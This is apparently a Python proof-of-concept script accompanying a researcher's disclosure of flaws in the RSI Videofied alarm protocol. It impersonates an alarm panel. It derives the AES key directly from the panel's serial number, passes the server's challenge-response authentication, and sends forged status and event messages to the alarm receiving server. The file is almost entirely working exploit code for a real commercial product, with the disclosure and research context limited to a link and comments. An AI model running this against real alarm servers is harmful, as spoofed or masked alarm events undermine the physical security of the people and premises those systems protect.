#https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/

import socket
from Crypto.Cipher import AES
from Crypto import Random
import time
# 4i Security's server and port
rsi_server = '127.0.0.1'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))
# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)
# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)
# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)
# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1
# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge
# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]
print 'key: ', key
cipher = AES.new(key.decode('hex'))
# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()
print 'Response:', response
# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()
# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'
print 'S:', msg
s.send(msg)
# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()
# This should be the encrypted response from the server
print 'R:', s.recv(1024)
# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)
msg = 'EVENT,1,3,2\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,27\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,24,1,3\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,25,0,2\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,3,62,0\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,4\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,19\x1a'
s.send(msg)
time.sleep(3)
msg = 'EVENT,20\x1a'
s.send(msg)
print s.recv(1024)
